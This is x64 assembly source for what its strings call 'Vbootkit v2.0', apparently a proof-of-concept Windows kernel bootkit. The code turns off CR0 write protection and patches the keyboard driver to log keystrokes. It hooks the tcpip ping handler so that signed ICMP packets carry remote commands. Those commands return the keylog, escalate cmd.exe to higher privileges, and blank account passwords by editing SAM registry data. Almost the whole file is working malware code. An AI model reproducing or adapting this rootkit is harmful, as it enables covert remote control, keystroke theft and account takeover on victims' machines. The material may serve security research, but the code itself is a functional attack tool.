I8042prt_Found:

; the base is in r8


; now fix get ready to get control
I8xGetByteAsynchronous EQU  0x2868;

mov r10,r8
add r10, I8xGetByteAsynchronous  + 0xf    ; we expect our patch to less than 0x10 bytes, it's actually 0xc bytes
mov [rdi+INPUT_RETURN_LOCATION],r10

lea r10,[rdi+PROCESS_INPUT_REQUEST]
mov [rdi+GENERIC_PATCH_JMP_LOCATION],r10

;now write the patch
; lets disable write protection

cli
mov rax, cr0
and eax,0FFFEFFFFh
mov cr0, rax

push rdi
lea rsi,[rdi+PATCH_GENERIC]
lea rdi,[r8+I8xGetByteAsynchronous]
mov rcx,PATCH_GENERIC_OVER-PATCH_GENERIC
rep movsb

pop rdi
; now get the protection back

or eax, 10000h
mov cr0, rax
sti

return_from_KEYBOARD_HOOK_without_patching:

add     rsp, 58h
ret


		
PATCH_GENERIC:
mov rax,0   ; this will be filled later on with what is required at that moment
GENERIC_PATCH_JMP_LOCATION EQU $-8
jmp rax
PATCH_GENERIC_OVER:



;----------------------------------------------------------------------------------
;PROCESS mouse and key board events
PROCESS_INPUT_REQUEST:

push RCX
push RDX



push rdi
push rbp
call GET_KERNEL_BASE_AND_CODE_BASE

; below 4 lines for testing & debugging
cmp RCX, 1
jne not_keyboard_skip

mov [rdi+RDX_KEYBOARD_TEMP],RDX

not_keyboard_skip:



pop rbp
mov rax,rdi
pop rdi

lea rax,[rax+AFTER_INPUT_CALL_COMPLETE]
push rax ; this wil give s control back after processing
mov [rsp+8],rbx
mov [rsp+16],rsi
push rdi
sub RSP,0x20
mov rax,0  ; this filled at runtime
INPUT_RETURN_LOCATION EQU $-8                  ; tcpip base +  Ipv4pHandleEchoRequest + 0x10
jmp RAX

AFTER_INPUT_CALL_COMPLETE:            ; after the cal is processed we are here again
pop RDX
pop RCX
cmp RCX, 1
jne not_KeyBoard
; here we should process the buffer and then jump back

push rbp
push rdi


call GET_KERNEL_BASE_AND_CODE_BASE
XOR RAX,RAX
XOR RBP,RBP

MOV al,[RDI+KEY_COUNT]
inc EAX
buffer_reinit:
MOV [RDI+KEY_COUNT], al ; increment buffer pointer for next time
mov RBP,RAX

cmp rbp,250
jl  keyboard_buffer_not_overflow

MOV al, 0 ;
jmp buffer_reinit 

keyboard_buffer_not_overflow:

PUSH RDX
mov RDX, [rdi+RDX_KEYBOARD_TEMP]
MOV al ,[RDX]
POP  RDX
mov byte [RDI+RBP+KEYBOARD_BUFFER], al

pop rdi
pop rbp


not_KeyBoard:
ret








; this functions resets passwords for the account id specified in RCX

; this functions resets passwords for the account id specified in RCX
ResetPassword:

sub     rsp, 100h

; first call swprintf to expand the number to key

mov ebx,0x53F6BC1A  ; swprintf
call CallExportedFunctionbyHash64 
mov     r8, rcx
lea     rdx, [rdi+SAM_KEY]  ; format
lea     rcx, [rdi+DATA_BUFFER]; [rsp+558h-0x98]
call rax   ;     call    swprintf

; Init unicode keyname and Object attributes

lea     rax, [rdi+DATA_BUFFER]; [rsp+558h-0x98]
mov     [rsp+60h], rax    ;Keyname.Buffer
mov   word  [rsp+58h], 70h    ;Keyname.Length
mov   word  [rsp+5ah], 72h     ;Keyname.MaximumLength

mov   dword  [rsp+0x78], 30h    ;Length
mov   qword  [rsp+ 0x80], 0    ;RootDirectory
lea     rax, [rsp+58h]
mov     [rsp+0x88], rax   ;Object Name
mov   dword  [rsp+90h], 40h      ;Attributes
mov   qword  [rsp+0x98], 0      ; SecurityDescriptor
mov   qword  [rsp+0xa0], 0  ;SecurityQualityOfService


; resolve ZwOpenKey
mov ebx,0x9291D353  ; ZwOpenKey
call CallExportedFunctionbyHash64 

lea     r8, [rsp+0x78] ; ObjectAttributes
mov     edx, 0F003Fh    ; DesiredAccess
lea     rcx, [rsp+ 0x38] ; KeyHandle
 call    rax    ; call zwopnekey
 cmp eax,0
 jne  KEY_NOT_VALID  ; some error occured


;okay key is valid
; now try to read the V Struct

; first lets set up the Value name unicode string

mov     eax, 0x56             ; 'V'
mov     [rsp+0x40], eax


lea     rax, [rsp+0x40]
mov     [rsp+0x50], rax  ;Buffer
mov   word  [rsp+0x48], 2    ;Length
mov   word  [rsp+0x4a], 4     ;Maximum Length

lea     rax, [rdi + DATA_BUFFER ]; [rsp+558h-0x498]
mov     [rsp+70h], rax

lea     rax, [rsp+68h]
mov     [rsp+28h], rax
mov     dword [rsp+20h], 400h   ; Length of Bufffer


;Lets resolve
mov ebx,0x5ACE2113  ; ZwQueryValueKey
call CallExportedFunctionbyHash64 

mov     r9, [rsp+70h ] ; KeyValueInformation
mov     r8d, 2          ; KeyValueInformationClass
lea     rdx, [rsp+48h] ; ValueName
mov     rcx, [rsp+38h] ; KeyHandle
call    rax  ;  ZwQueryValueKey

cmp eax,0
jl ERROR_WITH_CLOSE;

; now set the 0xAC byte as 0
; actually this byte is relate to hash len  of stored password
; if this byte is set to zero, windows thinks that password is blank

mov     rax, [rsp+70h]  ; KeyValueInformation
; first chck whether password is zero r not
;cmp byte [rax+12 + 0xAC], 0
;je ERROR_WITH_CLOSE



; check whether we are doing recovery / reset

cmp byte [RDi+PASSWORD_STATE],0
je doing_password_reset
jmp doing_password_restore

doing_password_reset:

; save previous value
xor rbx,rbx
mov ebx , [rax+8]

mov dl , byte [rax+12 + 0xAC] ; previous password state
mov byte [rax + rbx + 12 ],dl  

inc dword [rax + 8] ; increment the length of data

; password is not removed so rmove it now

mov byte [rax+12 + 0xAC], 0       ; set the len byte zero
                             ; this offset is now b8 because we have skip KEY_VALUE_PARTIAL_INFORMATION structure also 


jmp password_action_done

doing_password_restore:

; restore previously saved value

xor rbx,rbx
mov ebx , [rax+8]

mov dl ,byte [rax + rbx + 12  - 1 ]   ; previous password state
mov byte [rax+12 + 0xAC],dl  

dec dword [rax + 8] ; increment the length of data
;password value restored

password_action_done:

mov     rax, [rsp+70h]
add     rax, 0Ch
mov     rbx, [rsp+70h]
mov     ecx, [rbx+ 8h]
mov     dword [rsp+28h], ecx   ;data len
mov     [rsp+20h], rax   ; pointer to data




;
; lets resolve ZwSetValueKey
mov ebx,0xDF281D24  ; ZwSetValueKey
 call CallExportedFunctionbyHash64 
 
mov     r9d, 3          ; Type
xor     r8d, r8d        ; TitleIndex
lea     rdx, [rsp+48h] ; ValueName
mov     rcx, [rsp+38h] ; KeyHandle
call rax 




ERROR_WITH_CLOSE:
 mov     rcx, [rsp+38h] ; Handle
 mov ebx, 0x630AE822  ; ZwClose
 call CallExportedFunctionbyHash64 
 call RAX  ; Call zwclose



KEY_NOT_VALID:
add     rsp, 100h
ret

;---------------------------------------------------------------------
; This function is called at DISPATCH_LEVEL, so make sure no PAGE_FAULTS occur
PROCESS_PING_PACKET:

; do the processing here


; below code is from target place
mov     [rsp+8], rbx

; save evrything
PUSH RBX
PUSH RCX
PUSH RDX
PUSH RBP
PUSH RSI
PUSH RDI
PUSH R8
PUSH R9
PUSH R10
push R11
push r12
push r13
push r14
push r15

;---------------------------------------------------------
; MODIFY the packet according to COMMAND encoded in packet
push rcx  ; RCX point to UDP header
push RSI
PUSH RDI
PUSH RBP

call GET_KERNEL_BASE_AND_CODE_BASE

; first things first
; check whether the packet has been sent by our client and contains our signature
; if signature is not present just, hust skip the packet
MOV RSI,0x74696b746f6f6256        ;invert the stuff  56 62 6F 6F 74 6B 69 74  ; ......Vbootkit
cmp qword [RCX + 10],RSI
jne Command_Done   ; no commands to process



;;;;;;;;;;;;;; PROCESS SIGNATURE COMMAND ;;;;;;;;;;;;;;;;;;;;


cmp byte [rcx+8],00        ; Request Signature Command
jne Try_RESPONSE_Command

lea rsi,[RDI+SIGNATURE]
lea rdi,[rcx+8+2] ;don't leave 2 bytes for command and response
      
mov RCX,SIGNATURE_OVER - SIGNATURE
rep movsb

jmp Command_Done

;;;;;;;;;;;;;;;;;;;;;;;;;;; PROCESS RESPONSE COMMAND ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Try_RESPONSE_Command:  ; All the other commands are processed in REQUEST/RESPONSE style

cmp byte [rcx+8],0xff        ; Request Response Command
jne Try_Request_Command

; its a RESPONSE Command so ust copy everything fro the response buffer to packet
;BUG BUG BUG  ; we never verify the PACKET Size, if response is big we might crassh !!!! 

push rdi
lea rsi,[RDI+COMMAND_REQUEST+2]
lea rdi,[rcx+8 +2] ; leave 2 bytes for command and response

mov byte [rdi-1], 1  ; set that Valid Response received in this packet
                        
mov RCX, PACKET_SIZE  ; copy 500 bytes , PING data size should be 500 bytes response is limted to 
rep movsb
pop rdi
jmp Command_Done


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;PROCESS REQUEST COMMAND     

Try_Request_Command:   ; the command must be request
; setup data for processing

push RDI
lea rdi,[RDI+COMMAND_REQUEST]
lea rsi,[rcx+8] ; copy everything for command and response

mov byte [rsi+1], 0   ;  Set that response is pending
                        
mov RCX, PACKET_SIZE  ; copy 5000 bytes , PING data size should be 5000 bytes
rep movsb


pop rdi
mov ebx,0x627AB056  ; KeSetEvent
call CallExportedFunctionbyHash64

 xor     r8d, r8d        ; Wait
 xor     edx, edx        ; Increment
 lea     rcx, [RDI+COMMAND_EVENT] ; Event Object

call rax    ; KeSetEvent



Command_Done:


pop  RBP
pop RDI
pop RSI
pop RCX

; ALL Commands done


; load  evrything
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop RDI
pop RSI
pop RBP
pop RDX
pop RCX
pop RBX

; restore back stuff
;------------------------------------------------------------
push    rbp
push    rsi
push    rdi
push    r12
push    r13
push    r14
push    r15
mov rax,0  ; this filled at runtime
TCP_RETURN_LOCATION EQU $-8                  ; tcpip base +  Ipv4pHandleEchoRequest + 0x10
jmp RAX

;-----------------------------------------------------------------------------------------

; init events  and fall into infinite loop to process commands
; please note this function is run as a separate thread
DELAYED_COMMAND_PROCESSOR:

sub rsp, 0x58
call GET_KERNEL_BASE_AND_CODE_BASE

mov ebx ,0x4DF7AC9D  ; KeInitializeEvent
call CallExportedFunctionbyHash64

xor     r8d, r8d        ; State
mov     edx, 1          ; Type
lea     rcx, [RDI+COMMAND_EVENT] ; Event

call    rax ; KeInitializeEvent

Command_Processing_Infinite_Loop:


mov ebx ,0x1D93F035  ; KeWaitForSingleObject
call CallExportedFunctionbyHash64

 mov   qword  [rsp+58h-0x38], 0
 xor     r9d, r9d        ; Alertable
 xor     r8d, r8d        ; WaitMode
 xor     edx, edx        ; WaitReason
 lea     rcx, [RDI+COMMAND_EVENT] ; Event Object
 call rax ;KeWaitForSingleObject



  cmp byte [RDI + COMMAND_REQUEST],1         ; Delayed Signature Command
  je Process_Delayed_Signature_Command
  
  
  cmp byte [RDI + COMMAND_REQUEST],2     ;   Fetch Keyboard Buffer
  je Process_Fetch_Keyboard_Buffer_Command
  
  
  cmp byte [RDI + COMMAND_REQUEST],3      ; Escalate CMD.EXE
  je Escalate_Privilege_Command
  
  
  
  cmp byte [RDI + COMMAND_REQUEST],4      
  je Reset_Password_Command                 ; Reset Password for acounts
  
  
  ; invalid or unknown request
  jmp Command_Processing_Infinite_Loop
  
  
Process_Delayed_Signature_Command:

push rdi
lea rsi,[RDI+SIGNATURE]
lea rdi,[RDI+COMMAND_REQUEST+2] ; leave 2 bytes for command and response

                       
mov RCX,SIGNATURE_OVER - SIGNATURE
rep movsb

pop rdi

mov byte [RDI+COMMAND_REQUEST+1], 1  ; set that Valid Response received
jmp Command_Processing_Infinite_Loop



Process_Fetch_Keyboard_Buffer_Command:

push rdi
lea rsi,[RDI+KEY_COUNT]
lea rdi,[RDI+COMMAND_REQUEST+2] ; leave 2 bytes for command and response

XOR RCX,RCX                       
mov cl, [RDI+KEY_COUNT]
inc eax

rep movsb
pop rdi
mov byte [RDI+COMMAND_REQUEST+1], 1  ; set that Valid Response received
jmp Command_Processing_Infinite_Loop


Escalate_Privilege_Command :
call Escalate_CMD
mov byte [RDI+COMMAND_REQUEST+1], 1  ; set that Valid Response received
jmp Command_Processing_Infinite_Loop



Reset_Password_Command:
mov byte [RDI+RESET_PASSWORD], 1      ; set that password has to be cleared

mov byte [RDI+COMMAND_REQUEST+1], 1  ; set that Valid Response received
jmp Command_Processing_Infinite_Loop ;



ret  ; we will never reach here
;----------------------------------------------------------------------------
; DELAYED COMMAND PROCESSING over


; making it 1 will reset all the accounts passwords
; 1 thread is watching this varbale with 5 sec timer

RESET_PASSWORD: db 0;

PASSWORD_STATE:	db 0; this variable control whether passwords are to be restored
                    ; any value except 0 makes password resore work

SAM_KEY:
;just the wchar representation of L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\%08X"

db 0x5C,0x00,0x52,0x00,0x65,0x00,0x67,0x00,0x69,0x00,0x73,0x00,0x74,0x00,0x72,0x00 ; \.R.e.g.i.s.t.r.
db 0x79,0x00,0x5C,0x00,0x4D,0x00,0x61,0x00,0x63,0x00,0x68,0x00,0x69,0x00,0x6E,0x00 ; y.\.M.a.c.h.i.n.
db 0x65,0x00,0x5C,0x00,0x53,0x00,0x41,0x00,0x4D,0x00,0x5C,0x00,0x53,0x00,0x41,0x00 ; e.\.S.A.M.\.S.A.
db 0x4D,0x00,0x5C,0x00,0x44,0x00,0x6F,0x00,0x6D,0x00,0x61,0x00,0x69,0x00,0x6E,0x00 ; M.\.D.o.m.a.i.n.
db 0x73,0x00,0x5C,0x00,0x41,0x00,0x63,0x00,0x63,0x00,0x6F,0x00,0x75,0x00,0x6E,0x00 ; s.\.A.c.c.o.u.n.
db 0x74,0x00,0x5C,0x00,0x55,0x00,0x73,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x5C,0x00 ; t.\.U.s.e.r.s.\.
db 0x25,0x00,0x30,0x00,0x38,0x00,0x58,0x00,0x00,0x00                               ; %.0.8.X. 


NEW_CODEBASE: dq 0x88776655 

; this event will be raised  to process any commands from the PACKET
COMMAND_EVENT: times 3 dq 0      ;  ; EVENT structure is 24 bytes longs
               times 3 dq 0 
               times 3 dq 0 
               times 3 dq 0 


db 'Vbootkit v2.0 is here by Nitin & Vipin',0,0


SIGNATURE:
DEBUG_MESSAGE: db 'Vbootkit v2.0 is here by Nitin & Vipin',0,0
SIGNATURE_OVER:



times CODE_SIZE-($-$$) db 0	; Fill the rest with zeros
codeends EQU $ 

; below this everthing is zero and is used as buffer space

RDX_KEYBOARD_TEMP: dq 0        ; temporary storage of RDX


; no. of valid keys in buffer
KEY_COUNT:  db 0;

KEYBOARD_BUFFER: times 255 db 0;



COMMAND_REQUEST: db 0
COMMAND_RESPONSE: db 0
COMMAND_DATA:
 
 times 0x100 db 0
DATA_BUFFER:
; response can be a maximum of around 6400 bytes


CODEBASEIN1MB EQU 0x9c00 ;
CODEBASEIN1MBEXACT EQU 0x9c000;                                                            
